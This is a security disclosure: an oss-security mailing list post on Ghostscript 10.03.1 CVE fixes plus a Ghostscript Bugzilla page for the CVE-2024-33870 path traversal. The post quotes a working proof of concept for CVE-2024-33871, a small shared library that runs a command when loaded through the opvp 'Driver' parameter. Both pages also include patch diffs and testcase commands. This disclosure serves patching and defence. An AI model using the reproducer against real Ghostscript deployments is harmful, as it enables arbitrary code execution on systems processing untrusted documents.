=== Content from www.openwall.com_a108b606_20250110_155542.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](../../../2024/07/03/7) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240628033444.GA521@openwall.com>
Date: Fri, 28 Jun 2024 05:34:45 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Ghostscript 10.03.1 (2024-05-02) fixed 5 CVEs including CVE-2024-33871 arbitrary code execution

Hi,

Ghostscript 10.03.1 (2024-05-02) release notes:

<https://ghostscript.readthedocs.io/en/gs10.03.1/News.html>

mentions this:

> - Fixes for CVE-2024-33869, CVE-2023-52722, CVE-2024-33870,
> CVE-2024-33871 and CVE-2024-29510

> - A vulnerability was identified in the way Ghostscript/GhostPDL called
> tesseract for the OCR devices, which could allow arbitrary code
> execution. As as result, we strongly urge anyone including the OCR
> devices in their build to update as soon as possible.

Out of these, CVE-2024-33871 is probably the worst (CVSS 8.8 and
Important per Red Hat):

<https://access.redhat.com/security/cve/CVE-2024-33871>

> A flaw was found in Ghostscript. The "Driver" parameter for the
> "opvp"/"oprp" device specifies the name of a dynamic library and allows
> any library to be loaded. This flaw allows a malicious user to send a
> specially crafted document that, when processed by Ghostscript, could
> potentially lead to arbitrary code execution with the privileges of the
> Ghostscript process on the system.

(recently patched in RHEL 8 and 9, and thus in the RHEL rebuild distros)

There's a patch and a reproducer for it in upstream Bugzilla:

<https://bugs.ghostscript.com/show_bug.cgi?id=707754>

> zhutyra 2024-04-21 15:27:29 UTC
>
> Created attachment 25611 [details]
> patch

+++ a/contrib/opvp/gdevopvp.c
@@ -3456,6 +3456,12 @@ _put_params(gx_device *dev, gs_param_list *plist)
     code = param_read_string(plist, pname, &vdps);
     switch (code) {
     case 0:
+        if (gs_is_path_control_active(dev->memory)
+            && (!opdev->globals.vectorDriver || strlen(opdev->globals.vectorDriver) != vdps.size
+                || memcmp(opdev->globals.vectorDriver, vdps.data, vdps.size) != 0)) {
+            param_signal_error(plist, pname, gs_error_invalidaccess);
+            return_error(gs_error_invalidaccess);
+        }
         buff = realloc(buff, vdps.size + 1);
         memcpy(buff, vdps.data, vdps.size);
         buff[vdps.size] = 0;

> The "Driver" parameter for the "opvp"/"oprp" device specifies the name of a dynamic library and allows any library to be loaded.
>
> The patch does not allow changing this parameter after activating path control.
>
> Comment 1 zhutyra 2024-04-21 15:29:14 UTC
>
> Created attachment 25612 [details]
> exploit
>
> Exploit for x86_64 Linux.
> ```
> $ gs -q -dNODISPLAY opvplib.ps
> uid=1000(user) gid=1000(user) groups=1000(user)
> ```
>
> The file contains a precompiled library. If it doesn't work for you or you don't want to run unknown code, you can also do it manually.
> ```
> $ cat >lib.c <<"EOF"
> #include <stdlib.h>
> static void __attribute__ ((constructor)) init(void) {
>     exit(system("id"));
> }
> EOF
> $ gcc -fPIC -shared -o /tmp/lib.so lib.c
> $ gs -q -dNODISPLAY -c '<< /OutputDevice /opvp /Driver (/tmp/lib.so) >> setpagedevice'
> uid=1000(user) gid=1000(user) groups=1000(user)

The second attachment (exploit) gives me "Sorry, you are not authorized
to access attachment #25612." but apparently it's just a precompiled
version of what's included in the comment body, above, so not required
to exploit the issue.  A colleague has tested the above exploit on
latest CentOS 7 and it just worked (now patched in CIQ's CentOS Bridge).

CVE-2024-33870 is also pretty bad:

<https://access.redhat.com/security/cve/CVE-2024-33870>

> A flaw was found in Ghostscript. When the gp_validate_path_len function
> validates a path, it distinguishes between absolute and relative paths.
> In the case of relative paths, it will check the path with and without
> the current-directory-prefix ("foo" and "./foo"). This does not take
> into account paths with a parent-directory-prefix. Therefore, a path
> like "../../foo" is also tested as "./../../foo" and if the current
> directory "./" is in the permitted paths, it will pass the check, which
> may allow arbitrary file access.

The remaining 3 CVEs are also serious, although they have lower scores.

The CVE records for all four 2024 CVEs above still merely say "reserved
by a CNA", without descriptions.  The 2023 CVE has proper info in it.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugs.ghostscript.com_d1e1021a_20250110_155542.html ===


Bugzilla – Bug 707686
Path traversal to arbitrary files if the current directory is in the permitted paths.
Last modified: 2024-05-24 13:24:43 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=707686&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=707686&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 707686**](show_bug.cgi?id=707686)
- Path traversal to arbitrary files if the current directory is in the permitted paths.

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Path traversal to arbitrary files if the current directory is in the permitte...

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Ghostscript | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Ghostscript "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Security (public) ([show other bugs](buglist.cgi?component=Security%20(public)&product=Ghostscript&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | P2 normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Chris Liddell (chrisl) | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2024-03-24 03:09 UTC by zhutyra | | --- | --- | | Modified: | 2024-05-24 13:24 UTC ([History](show_activity.cgi?id=707686)) | | CC List: | 11 users (show)  akhaitov carnil cbuissar dr jsmeix ken.sharp marc.deslauriers rlescak robin.watts sam till.kamppeter | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Customer:](page.cgi?id=fields.html#cf_customer "A custom Free Text field in this installation of Bugzilla.") |  | | [Word Size:](page.cgi?id=fields.html#cf_wordsize "For example x86 would be 32 and x86_64 would be 64.") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**patch**](attachment.cgi?id=25510 "View the content of the attachment") (1.56 KB, patch)  [2024-03-24 03:09 UTC](#attach_25510 "Go to the comment associated with the attachment"), zhutyra | [Details](attachment.cgi?id=25510&action=edit) | [Diff](attachment.cgi?id=25510&action=diff) | | [Add an attachment](attachment.cgi?bugid=707686&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=707686&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=707686#c0)  zhutyra    2024-03-24 03:09:38 UTC  ``` Created [attachment 25510](attachment.cgi?id=25510&action=diff "patch") [[details]](attachment.cgi?id=25510&action=edit "patch") patch  When the `gp_validate_path_len` function validates a path, it distinguishes between absolute and relative paths. In the case of relative paths, it will check the path with and without the current-directory-prefix ("foo" and "./foo").  The problem is that it doesn't take into account paths with a parent-directory-prefix. So a path like "../../foo" is also tested as "./../../foo" and if the current directory "./" is in the permitted paths, it will pass the check and you can access arbitrary files.  The fix is simple, I added a test for a path with the parent directory prefix. ```  [Comment 1](show_bug.cgi?id=707686#c1)  zhutyra    2024-03-24 03:11:29 UTC  ``` Created [attachment 25511](attachment.cgi?id=25511) [[details]](attachment.cgi?id=25511&action=edit) testcase  ``` gs -P curdirtravers.ps gs -I./ curdirtravers.ps gs --permit-file-XXX=./* curdirtravers.ps ``` ```  [Comment 2](show_bug.cgi?id=707686#c2)  Ken Sharp    2024-04-05 08:10:32 UTC  ``` It's been a busy few weeks, and it still hasn't settled down yet, so I'm commenting on all the open bug threads to reassure people that we are working on these. Due to slow responses on one thread it we are unfortunately not yet able to estimate a patch release date.  Because we know that there is at least one person watching/mining our public repositories for security commits we are keeping these in a private repository until a patch release. I'm afraid that means I can't just point to a proposed commit in Gitweb.  The patch for this issue is :  diff --git a/base/gpmisc.c b/base/gpmisc.c index [59423584a](http://www.ghostscript.com/cgi-bin/findgit.cgi?59423584a)..[7d102d386](http://www.ghostscript.com/cgi-bin/findgit.cgi?7d102d386) 100644 --- a/base/gpmisc.c +++ b/base/gpmisc.c @@ -1042,7 +1042,7 @@ gp_validate_path_len(const gs_memory_t *mem,                       const uint         len,                       const char        *mode)  { -    char *buffer, *bufferfull; +    char *buffer, *bufferfull = NULL;      uint rlen;      int code = 0;      const char *cdirstr = gp_file_name_current(); @@ -1097,8 +1097,10 @@ gp_validate_path_len(const gs_memory_t *mem,              return gs_error_VMerror;            buffer = bufferfull + prefix_len; -        if (gp_file_name_reduce(path, (uint)len, buffer, &rlen) != gp_combine_success) -            return gs_error_invalidfileaccess; +        if (gp_file_name_reduce(path, (uint)len, buffer, &rlen) != gp_combine_success) { +            code = gs_note_error(gs_error_invalidfileaccess); +            goto exit; +        }          buffer[rlen] = 0;      }      while (1) { @@ -1133,9 +1135,34 @@ gp_validate_path_len(const gs_memory_t *mem,              code = gs_note_error(gs_error_invalidfileaccess);          }          if (code < 0 && prefix_len > 0 && buffer > bufferfull) { +            uint newlen = rlen + cdirstrl + dirsepstrl; +            char *newbuffer; +            int code; +              buffer = bufferfull;              memcpy(buffer, cdirstr, cdirstrl);              memcpy(buffer + cdirstrl, dirsepstr, dirsepstrl); + +            /* We've prepended a './' or similar for the current working directory. We need +             * to execute file_name_reduce on that, to eliminate any '../' or similar from +             * the (new) full path. +             */ +            newbuffer = (char *)gs_alloc_bytes(mem->thread_safe_memory, newlen + 1, "gp_validate_path"); +            if (newbuffer == NULL) { +                code = gs_note_error(gs_error_VMerror); +                goto exit; +            } + +            memcpy(newbuffer, buffer, rlen + cdirstrl + dirsepstrl); +            newbuffer[newlen] = 0x00; + +            code = gp_file_name_reduce(newbuffer, (uint)newlen, buffer, &newlen); +            gs_free_object(mem->thread_safe_memory, newbuffer, "gp_validate_path"); +            if (code != gp_combine_success) { +                code = gs_note_error(gs_error_invalidfileaccess); +                goto exit; +            } +              continue;          }          else if (code < 0 && cdirstrl > 0 && prefix_len == 0 && buffer == bufferfull) { @@ -1154,6 +1181,7 @@ gp_validate_path_len(const gs_memory_t *mem,                                             gs_path_control_flag_is_scratch_file);      }   +exit:      gs_free_object(mem->thread_safe_memory, bufferfull, "gp_validate_path");  #ifdef EACCES      if (code == gs_error_invalidfileaccess) ```  [Comment 3](show_bug.cgi?id=707686#c3)  zhutyra    2024-04-05 10:06:42 UTC  ``` Right now I'm not on a computer where I can compile and test it, but I think it fixes the vulnerability.  But you don't need to reduce the path twice and I don't like that the code is sort of "algorithmically" still wrong. * It looks at the cwd prefix before the path is reduced. After the reduction, the path is changed so the previous look at the prefix is irrelevant. * The path variants with and without cwd prefix is still tried on all non-absolute paths.  I would like it more like this ``` if it is a pipe:     leave the path as is elif it is a weird pipe-like path:     reject it (done in the other patch) else:     first of all reduce the path     if and only iff it is a cwd path:         fiddle with the cwd prefix ``` ```  [Comment 4](show_bug.cgi?id=707686#c4)  Chris Liddell (chrisl)    2024-04-29 12:39:45 UTC  ``` Use CVE-2024-33870 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=707686)
* - [XML](show_bug.cgi?ctype=xml&id=707686)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=707686)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=707686&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=707686&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


